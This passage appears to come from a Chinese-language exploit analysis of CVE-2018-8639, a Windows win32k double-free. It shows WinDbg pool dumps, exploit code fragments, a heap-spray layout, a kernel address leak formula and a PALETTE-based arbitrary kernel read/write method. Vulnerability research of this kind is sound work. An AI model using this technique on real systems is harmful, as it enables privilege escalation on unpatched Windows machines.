    kd> !pool @$t1;
    Pool page fffff900c566de20 region is Paged session pool
    //AcceleratorTable占用了e00空间
     fffff900c566d000 size:  e00 previous size:    0  (Allocated)  Usac Process: fffffa8001b80970
     fffff900c566de00 size:   10 previous size:  e00  (Free)       ....
     //lpszMenuName分配了 1f0大小的空间
    *fffff900c566de10 size:  1f0 previous size:   10  (Allocated) *Ustx Process: fffffa8001b80970
            Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
    //在执行完这行代码后
    SetClassLongPtrA(hWndCloneCls, GCLP_MENUNAME, (LONG64)NewMenuName);
    kd> !pool @$t1;
    Pool page fffff900c566de20 region is Paged session pool
     fffff900c566d000 size:  e00 previous size:    0  (Allocated)  Usac Process: fffffa8001b80970
     //1f0和10释放后合并变成200大小free空间
    *fffff900c566de00 size:  200 previous size:  e00  (Free)      *....
            Owning component : Unknown (update pooltag.txt)
    //在执行完这行代码后
    NtGdiSetLinkedUFIs(hDC_Writer[i], flag, 0x3b);
    kd> !pool @$t1;
    Pool page fffff900c566de20 region is Paged session pool
     fffff900c566d000 size:  e00 previous size:    0  (Allocated)  Usac Process: fffffa8001b80970
     fffff900c566de00 size:   10 previous size:  e00  (Free)       ....
    //1f0空间被hDC_Writer占位 
    *fffff900c566de10 size:  1f0 previous size:   10  (Allocated) *Gadd
            Pooltag Gadd : GDITAG_DC_FONT, Binary : win32k.sys
    //在执行完这行代码后
    DestroyWindow(hWndCloneCls);
    NtUserUnregisterClass(pClassName, hInst, &a);
    kd> !pool @$t1;
    Pool page fffff900c566de20 region is Paged session pool
     fffff900c566d000 size:  e00 previous size:    0  (Allocated)  Usac Process: fffffa8001b80970
     //80+180空间为free状态
    *fffff900c566de00 size:   80 previous size:  e00  (Free)      *....
          Owning component : Unknown (update pooltag.txt)
      //GTmp怎么来的是不是DestroyWindow后又在NtUserUnregisterClass过程中产生的?
     fffff900c566de80 size:  180 previous size:   80  (Free )  GTmp
     //在执行完这行代码后
     hPalettes[i] = CreatePalette(lPalette);
     kd> !pool @$t1;
    Pool page fffff900c566de20 region is Paged session pool
     fffff900c566d000 size:  d10 previous size:    0  (Allocated)  Usac Process: fffffa8001b80970
     fffff900c566dd10 size:   f0 previous size:  d10  (Free)       ....
     //已被PALETTE占位,HDC对象数据对准了PALETTE +0x10处正好是要修改PALETTE大小
    *fffff900c566de00 size:  100 previous size:   f0  (Allocated) *Gh28
            Pooltag Gh28 : GDITAG_HMGR_SPRITE_TYPE, Binary : win32k.sys
     fffff900c566df00 size:  100 previous size:  100  (Allocated)  Gh28
笔者借鉴[CVE-2018-8453](https://bbs.pediy.com/thread-249021.htm
"看雪分析")布局思路,测试了一种新的布局方式,先申请创建4000个C10大小的块,位于堆顶部,然后创建4000个200大小的块,位于堆底部,这样就在堆中间留出了1F0大小的空隙,再创建5000个1F0大小的小块,把池堆中的空隙填满,然后每间隔2个1F0大小释放其中一个,这样就在堆中留出大量1F0大小的空隙用于放置lpszMenuName,这样正好把空隙控制在1F0大小,200大小的块不会覆盖1F0大小的块也填满了1F0之前的空隙使其剩余空隙保留在小于200大小,不会影响之后的GDI和PALETTE也不会跑到这些空隙去,第一次释放用GDI占位,第二次释放先释放C10用C00占位,然后创建2w个100大小PALETTE,填充二次释放区域,经测试布局成功率大于90%,池风水布局后如图:
    //在用户态创建4000个200大小的块下断点
    //AcceleratorTable泄露内核地址计算公式为(SHAREDINFO->aheList+sizeOf(HANDLEENTRY)*(AcceleratorTabl句柄&0xffff))
    0:000> dq CVE_2018_8639_EXP!hAccel_0x200_bottom
    00000001`3fe1b940  00000000`003528f1 00000000`003d00f3
    00000001`3fe1b950  00000000`003c01f1 00000000`0012098f
    00000001`3fe1b960  00000000`00100991 00000000`000c097b
    00000001`3fe1b970  00000000`00090973 00000000`000b00ef
    00000001`3fe1b980  00000000`001201fb 00000000`00090981
    00000001`3fe1b990  00000000`00190069 00000000`000b09c1
    00000001`3fe1b9a0  00000000`0009099b 00000000`00070999
    00000001`3fe1b9b0  00000000`0008097d 00000000`000809ad
    //看最后一个
    0:000> dq poi(user32!gSharedInfo+8)+18h*(00000000`000809ad&0xffff)
    00000000`004ee838  fffff900`c5c15e10 fffff900`c26f3460
    00000000`004ee848  00000000`00080008 fffff900`c5caac20
    //在内核态
    kd> !pool  fffff900`c5c15e10
    Pool page fffff900c5c15e10 region is Paged session pool
     fffff900c5c15000 size:  c10 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
     fffff900c5c15c10 size:  1f0 previous size:  c10  (Allocated)  Usac Process: fffffa8001a65520
    *fffff900c5c15e00 size:  200 previous size:  1f0  (Allocated) *Usac Process: fffffa8001a65520
            Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
    //在执行完这行代码后
    hWndCloneCls = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 0, 0, nullptr, nullptr, hInst, nullptr);
    //在win32k!ReferenceClass函数触发断点,此时我们查看pool的分配情况
    kd> bp win32k!ReferenceClass+0x6b "p;"
    WARNING: Software breakpoints on session addresses can cause bugchecks.
    Use hardware execution breakpoints (ba e) if possible.
    kd> g
    win32k!ReferenceClass+0x70:
    fffff960`0012fcb0 488bf0          mov     rsi,rax
    *** WARNING: Unable to verify checksum for CVE-2018-8639-EXP.exe
    *** ERROR: Module load completed but symbols could not be loaded for CVE-2018-8639-EXP.exe
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for kernel32.dll - 
    kd> $$ r;
    rax=fffff900c3803f90 rbx=fffffa800485e760 rcx=fffff900c3804030
    rdx=0000000000000000 rsi=0000000000000000 rdi=fffff900c082beb0
    rip=fffff9600012fcb0 rsp=fffff880037e0670 rbp=fffff900c082beb0
     r8=0000000000000000  r9=0000000000000000 r10=0000000000000010
    r11=fffff880037e0610 r12=fffff900c3803e60 r13=fffff880037e0000
    r14=0000000000000000 r15=fffff880037e09a8
    iopl=0         nv up ei ng nz na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
    win32k!ReferenceClass+0x70:
    fffff960`0012fcb0 488bf0          mov     rsi,rax
    kd> r $t0=@rax;
    kd> .printf"t0=%pn",@$t0;
    t0=fffff900c3803f90
    kd> gu;r $t1=poi(@$t0+88);
    WARNING: Software breakpoints on session addresses can cause bugchecks.
    Use hardware execution breakpoints (ba e) if possible.
    kd> .printf"t1=%pn",@$t1;
    t1=fffff900c3371c20
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
     fffff900c3371000 size:  c10 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
     //lpszMenuName分配了 1f0大小的空间
    *fffff900c3371c10 size:  1f0 previous size:  c10  (Allocated) *Ustx Process: fffffa8001a65520
            Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
     fffff900c3371e00 size:  200 previous size:  1f0  (Allocated)  Usac Process: fffffa8001a65520
    //在执行完这行代码后
    SetClassLongPtrA(hWndCloneCls, GCLP_MENUNAME, (LONG64)NewMenuName);
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
     fffff900c3371000 size:  c10 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
    *fffff900c3371c10 size:  1f0 previous size:  c10  (Free)      *Ustx
            Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
     fffff900c3371e00 size:  200 previous size:  1f0  (Allocated)  Usac Process: fffffa8001a65520
    //在执行完这行代码后
    NtGdiSetLinkedUFIs(hDC_Writer[i], flag, 0x3b);
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
     fffff900c3371000 size:  c10 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
     //GDI对象被创建
    *fffff900c3371c10 size:  1f0 previous size:  c10  (Allocated) *Gadd
            Pooltag Gadd : GDITAG_DC_FONT, Binary : win32k.sys
     fffff900c3371e00 size:  200 previous size:  1f0  (Allocated)  Usac Process: fffffa8001a65520
    //在执行完这行代码后
    DestroyWindow(hWndCloneCls);
    NtUserUnregisterClass(pClassName, hInst, &a);
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
     fffff900c3371000 size:  c10 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
     //GDI对象被被释放
    *fffff900c3371c10 size:  1f0 previous size:  c10  (Free)      *Gadd
            Pooltag Gadd : GDITAG_DC_FONT, Binary : win32k.sys
     fffff900c3371e00 size:  200 previous size:  1f0  (Allocated)  Usac Process: fffffa8001a65520
     //在执行完这行代码后
    DestroyAcceleratorTable(hAccel_0xC10_top[i]);
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
    //hAccel_0xC10_top被释放
    *fffff900c3371000 size:  e00 previous size:    0  (Free)      *Usac
            Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
     fffff900c3371e00 size:  200 previous size:  e00  (Allocated)  Usac Process: fffffa8001a65520
    //在执行完这行代码后
    hAccel_0xC10_top[i] = CreateAcceleratorTableW(lpAccel, 0x1F7);
     kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
    //hAccel_0xC10_top被重新申请C00大小
     fffff900c3371000 size:  c00 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
    *fffff900c3371c00 size:  200 previous size:  c00  (Free)      *....
            Owning component : Unknown (update pooltag.txt)
     fffff900c3371e00 size:  200 previous size:  200  (Allocated)  Usac Process: fffffa8001a65520
    //在执行完这行代码后
    hPalettes[i] = CreatePalette(lPalette);
    kd> !pool @$t1;
    Pool page fffff900c3371c20 region is Paged session pool
     fffff900c3371000 size:  c00 previous size:    0  (Allocated)  Usac Process: fffffa8001a65520
     //Palette成功占位
    *fffff900c3371c00 size:  100 previous size:  c00  (Allocated) *Gh18
            Pooltag Gh18 : GDITAG_HMGR_SPRITE_TYPE, Binary : win32k.sys
     fffff900c3371d00 size:  100 previous size:  100  (Allocated)  Gh18
     fffff900c3371e00 size:  200 previous size:  100  (Allocated)  Usac Process: fffffa8001a65520
整个doublefree占位过程如图:
之后的利用方式与原poc相同这里略过,下面有详细解释
## 漏洞利用调试分析
参考[PALETTE滥用](https://www.anquanke.com/post/id/168572
"PALETTE滥用")这篇文章为exp达到内核内存任意位置读写的方式,poc使用NtGdiSetLinkedUFIs函数把写入的指定HDC对象数据对准了PALETTE
+1c也就是PALETTE64->cEntries位置值为0xfff构造了一个越界的PALETTE实现
    #pragma pack(push, 4)
    struct _PALETTE64
    {
      _BYTE BaseObject[24];
      ULONG flPal;  
      ULONG cEntries;//0x1c
      ULONG ulTime;
      ULONG64 hdcHead;
      ULONG64 hSelected;
      ULONG64 cRefhpal;
      ULONG cRefRegular;
      ULONG64 ptransFore;
      ULONG64 ptransCurrent;
      ULONG64 ptransOld;
      ULONG64 unk_038;
      ULONG64 pfnGetNearest;
      ULONG64 pfnGetMatch;
      ULONG64 ulRGBTime;
      ULONG64 pRGBXlate;
      PALETTEENTRY *pFirstColor;;//0x80
      struct _PALETTE *ppalThis;
      PALETTEENTRY apalColors[3];
    };
    #pragma pack(pop)
NtGdiSetLinkedUFIs主要实现为XDCOBJ::bSetLinkedUFIs内部过程,在x64系统下如果之前未申请内存就新申请内存在对象0x138位置保存了申请内存的地址然后拷贝
8 _Count大小内存,如果之前申请过内存就直接拷贝传入的 8_ Count大小内存,这里buf可控,count也可控
    signed __int64 __fastcall XDCOBJ::bSetLinkedUFIs(PALETTE64 *this, struct _UNIVERSAL_FONT_ID *buff, unsigned int count)
    {
      PALETTE64 *_This; // rbx
      __int64 CountSize; // rdi
      __int64 that; // rax
      struct _UNIVERSAL_FONT_ID *buffRef; // r12
      void *hasData; // rcx
      signed __int64 result; // rax
      PVOID AllocedAddress; // rsi
      unsigned int size; // eax
      size_t sizeRef; // rbp
      PVOID addr; // rax
      _This = this;
      CountSize = count;
      *(_DWORD *)(*(_QWORD *)this->BaseObject + 0x144i64) = cout == 0;
      that = *(_QWORD *)this->BaseObject;